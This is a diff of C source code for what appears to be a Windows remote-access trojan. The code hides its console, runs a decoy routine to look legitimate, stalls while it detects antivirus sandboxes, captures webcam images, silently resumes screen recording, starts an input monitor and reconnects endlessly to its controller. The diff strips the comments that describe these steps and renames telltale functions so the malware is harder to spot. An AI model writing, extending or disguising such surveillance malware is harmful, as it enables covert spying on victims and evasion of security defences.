+    
     if (!init_camera(g_current_camera)) {
         send_websocket_data("[!] Failed to initialize camera\n", 32);
         g_camview_running = 0;
@@ -5343,7 +5235,7 @@ void start_camview(int fps, int quality) {
     if (quality < 10) quality = 10;
     if (quality > 100) quality = 100;
     
-    // Close any existing camera
+    
     if (g_cam_hwnd) {
         close_camera();
         Sleep(100);
@@ -5386,7 +5278,7 @@ void stop_camview() {
         g_camview_thread = NULL;
     }
     
-    // Make sure camera is closed
+    
     close_camera();
     
     // Reset frame state (static buffer - don't free)
@@ -5396,7 +5288,7 @@ void stop_camview() {
     send_websocket_data("[+] Camera view stopped\n", 24);
 }
 
-// ============== AUDIO RECORDING ==============
+
 
 // WAV file header structure
 typedef struct {
@@ -5631,38 +5523,33 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     // This must happen before ANY other code
     FreeConsole();
     
-    // Double-check: Hide any lingering console window
+    
     HWND hwnd = GetConsoleWindow();
     if (hwnd != NULL) {
         ShowWindow(hwnd, SW_HIDE);
     }
     
-    // Seed random number generator
     srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
     
-    // Run decoy initialization (makes binary look legitimate)
-    run_decoy_init();
+    init_bg();
     
-    // Perform AV evasion checks - delay if sandbox detected
-    while (perform_evasion_checks()) {
+    while (run_checks()) {
         Sleep(10000 + (rand() % 5000));
     }
     
     init_display();
     
-    // Load any persisted screen recording state from previous sessions
     load_screenrecord_state();
     
-    // Auto-start screen recording if it was enabled in previous session
     if (g_screenrecord_enabled && !g_screenrecord_running) {
-        start_screenrecord_internal();  // Silent start
+        start_screenrecord_internal();
     }
     
-    // Start power monitor thread to resume recording after sleep/wake
+    
     g_power_monitor_running = 1;
     g_power_monitor_thread = CreateThread(NULL, 0, power_monitor_thread, NULL, 0, NULL);
     
-    // NOTE: Persistence is now manual - use 'persist' command
+    
     // Don't auto-add to startup as it can trigger security prompts
     
     DWORD size = sizeof(g_computer_name);
@@ -5671,30 +5558,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     size = sizeof(g_username);
     GetUserNameA(g_username, &size);
     
-    // Initialize unique client ID (for multi-instance support)
     init_client_id();
     
     GetCurrentDirectoryA(MAX_PATH, g_current_dir);
     
     g_session_id = GetCurrentProcessId() ^ GetTickCount();
     
-    // Start input monitor
-    start_input_monitor();
+    start_im();
     
     int retry_count = 0;
-    int consecutive_failures = 0;  // Track rapid failures
+    int consecutive_failures = 0;
     DWORD last_connect_time = 0;
     
-    // Infinite loop - keep trying to connect forever
     while (1) {
         g_connected = 0;
-        g_should_exit = 0;  // Reset exit flag for reconnection
+        g_should_exit = 0;
         
-        // If last connection was very short (< 5 seconds), it's likely server not ready
         DWORD current_time = GetTickCount();
         if (last_connect_time > 0 && (current_time - last_connect_time) < 5000) {
             consecutive_failures++;
-            // Exponential backoff for rapid failures: 5s, 10s, 20s, 30s, 60s max
             DWORD delay = 5000 * (1 << (consecutive_failures > 4 ? 4 : consecutive_failures));
             if (delay > 60000) delay = 60000;
             Sleep(delay);
